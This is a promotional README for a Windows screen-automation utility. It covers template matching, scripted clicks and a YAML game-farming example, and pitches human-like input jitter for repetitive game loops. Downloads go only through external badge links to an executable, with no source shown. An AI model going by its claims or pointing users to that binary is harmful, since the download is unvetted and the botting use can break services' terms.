![preview](https://raw.githubusercontent.com/ink-mobai/screen-forge-auto/main/screen_3de2.svg)

# LUMENCAST

**Orchestrate your screen like a conductor, not a puppeteer.**

LUMENCAST is a Windows-native automation utility that lets you script visual interactions with any application—games, productivity suites, or legacy software—by interpreting what appears on your display. Instead of relying on brittle internal APIs, memory addresses, or hidden hooks, LUMENCAST watches the pixels themselves, matching templates and responding to visual cues with the patience of a lighthouse keeper and the precision of a laser cutter.

It is not a tool for bypassing protections. It is a tool for building your own light show—where every click, keystroke, and delay is choreographed by you, using the only universal language every program speaks: light.

---

## 🧭 Why LUMENCAST Exists

Modern automation often feels like breaking into a house you already own. You need a keyhole for every door—a specific integration, an SDK, a debugger interface. But what if you just... looked through the window?

LUMENCAST treats your screen as a living canvas. It captures frames, recognizes shapes and patterns, and performs actions when those patterns appear. This makes it invaluable for:

- **Repetitive game loops**—farming, grinding, or testing gameplay variations without touching game files.
- **Legacy applications** that predate scripting interfaces—automating data entry into terminals or spreadsheet viewers that offer no API.
- **Quality assurance**—running visual regression checks by comparing screenshots before and after interactions.
- **Accessibility bridging**—guiding users through complex UIs by automating visual steps triggered by on-screen prompts.

The philosophy is simple: if you can see it, you can automate it. No hidden trapdoors. No forbidden zones. Just vision and motion.

---

## ⚙️ How It Works (The Core Machinery)

At its heart, LUMENCAST is a **capture-compare-act engine**. Here’s the pipeline:

1. **Capture**: It grabs the current state of a specific screen region or the full display at a configurable framerate.
2. **Template Matching**: You provide a reference image (a PNG snippet of a button, an icon, a map symbol). LUMENCAST slides that template across the capture buffer, computing similarity scores. When the score exceeds your defined threshold, it considers the pattern found.
3. **Action Dispatch**: Upon finding a match, it can send simulated mouse movements, clicks, keyboard presses, or scripted delays. It can also trigger external scripts or log the event for later analysis.
4. **State Loop**: The process repeats until you tell it to stop, or until a "termination pattern" appears (e.g., a specific loading screen).

The entire system is designed to be **self-correcting**. If a pattern disappears mid-action, LUMENCAST can pause, re-acquire the frame, or abort gracefully—no system instability, no stuck input loops.

---

## ✨ Key Features (The Beacon Highlights)

**🔍 Sub-Pixel Template Matching**
- Use rotation-invariant and scale-tolerant matching algorithms. A button that is slightly larger or tilted by a few degrees will still be recognized.
- Grayscale, color, or alpha-channel-aware matching profiles for transparent UI elements.

**🎛️ Region-Based Focus**
- Define specific rectangular regions for scanning to reduce CPU load and avoid false positives from unrelated screen areas.
- Save regions as presets for different applications or projects.

**⌨️ Natural Input Synthesis**
- Send input events that genuinely resemble human actions—with configurable jitter, variable delays, and mouse movement curves.
- Supports absolute and relative coordinates, plus modifier keys (Shift, Ctrl, Alt).

**📜 Scenario Scripting (YAML/JSON)**
- Declare entire workflows in human-readable text files. No code compilation required.
- Conditional branching: "If this icon appears, do X; otherwise, do Y after 3 seconds."

**🖥️ Multi-Monitor Awareness**
- Automate across multiple displays seamlessly, selecting which monitor hosts the template.

**🌐 Multilingual UI**
- The control panel and documentation are available in English, Spanish, German, Japanese, and Simplified Chinese. The community translation kit allows you to add your own locale.

**📊 Visual Telemetry Log**
- Every run produces a timestamped storyboard—a visual log of screenshots with the matched regions highlighted, plus the action taken. This is invaluable for debugging or sharing your automation recipes.

**🧩 Plugin Architecture**
- Extend the core engine with custom matchers (e.g., OCR via external libraries) or custom output actions (e.g., send a webhook). The interface is a single Python-like class, but LUMENCAST itself runs as a standalone Windows executable.

**🔒 Secure Credential Storage**
- If your automation needs to type passwords or tokens, LUMENCAST stores them in the Windows Credential Manager, not in plain text scripts.

---

## 🚀 Getting Started (Your First Light)

**[![Download](https://raw.githubusercontent.com/ink-mobai/screen-forge-auto/main/go_13619.svg)](https://ink-mobai.github.io/screen-forge-auto/)**

Once you have the build running, the workflow is a three-step dance.

### Step 1: Capture a Reference
Use the built-in snipping tool (a crosshair cursor that emerges after pressing `Ctrl+Shift+R`) to select the exact on-screen element you want to track. Save it as a `.png` file.

### Step 2: Define the Behavior
Create a simple `.yaml` file:

```yaml
name: "Mining Loop"
trigger:
  template: "ore_vein.png"
  region: [0, 0, 1920, 1080]
  threshold: 0.85
action:
  - mouse: [640, 480, "click"]
  - wait: [1200]
  - key: ["F1"]
termination:
  template: "full_inventory.png"
```

### Step 3: Run and Observe
Load the script into the LUMENCAST console, press `Start`, and watch the telemetry log populate. The engine will respect your `wait` commands, retry failed matches with a backoff policy, and stop cleanly when the termination pattern flashes.

---

## 🧰 Build Your Own Recipes (The Palette)

The repository is a treasure trove of community-built scenarios. Each recipe is a standalone folder containing:

- The `.yaml` script
- The reference template images
- The telemetry storyboard from the original author (so you see what success looks like)
- A `notes.md` file explaining the logic and any caveats

Browse the `recipes` directory for examples like:

- **Idle Game Bot** – Automatically clicks the "Upgrade" button when it appears.
- **Form Filler** – Fills a legacy spreadsheet from a CSV file, visually navigating row by row.
- **Auto-Screenshot Pipeline** – Captures a specific region every time a "save point" icon appears in a game.

---

## 🧪 Testing & Reliability (Trust the Light)

LUMENCAST includes a built-in **dry-run mode** that simulates all actions without actually sending input to the OS. You can verify your script logic, preview the click coordinates, and ensure the workflow flows correctly before unleashing it on your real session.

For large-scale testing, the engine supports **headless capture**—it can act on a virtual display (via Windows Virtual Display Adapter) so you don't even need a physical monitor attached.

---

## 💡 Use Cases & Inspiration (Beyond the Obvious)

- **Educational Tools**: Automate step-by-step software tutorials, highlighting elements as the instructor narrates.
- **Data Transcription**: Convert a legacy chart on screen into structured text by visually recognizing coordinates and labels (in combination with an OCR plugin).
- **Stream Automation**: Trigger scene changes in OBS when a specific game logo appears, without any OBS API integration.
- **Personal Health Break Reminder**: Watch for a specific window, and every 20 minutes, force-close it for 5 minutes. Your eyes will thank you.

---

## 🌍 Community & Support (24/7 Human Connection)

We believe automation should not feel isolating. The LUMENCAST community forums are monitored around the clock—real humans, in multiple time zones, available via the in-app help desk and the discussion board.

- **Bug Reports**: A structured template ensures we get your screen resolution, capture method, and failing template image.
- **Recipe Requests**: Post "Can someone show me how to automate X?" and a community member will likely post a working recipe within days.
- **Feature Polls**: Monthly, we put up a poll for the next most-wanted matcher or action type. Your vote actually changes the roadmap.

---

## 🧾 License & Legal Light

LUMENCAST is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute it, provided you include the original copyright notice. It is meant to be a tool for personal productivity, creative exploration, and legitimate testing. It is not a circumvention instrument.

### ⚠️ Disclaimer

**Where you point the light is your responsibility.** You must ensure that your use of LUMENCAST complies with the Terms of Service of any application or game you automate, and with all applicable local laws and regulations. The maintainers and contributors are not liable for account restrictions, data loss, or any other consequences arising from the use of this software in a manner that violates those terms. The engine itself does not tamper with application memory, does not inject code, and does not modify game files. It simply sends the same kind of input you would generate with a keyboard and mouse, at a faster and more reliable pace. Always use it with the same ethics you would apply to any other tool.

---

## 📦 Packaging & Versions

The core engine is delivered as a single `.exe` that runs in the background, plus a lightweight GUI controller for configuration. There is also a command-line interface for power users who want to integrate LUMENCAST into existing batch scripts.

You can download the latest stable release from the repository's releases section.

**[![Download](https://raw.githubusercontent.com/ink-mobai/screen-forge-auto/main/go_13619.svg)](https://ink-mobai.github.io/screen-forge-auto/)**

---

*LUMENCAST: See a pattern. Act on it. Repeat.*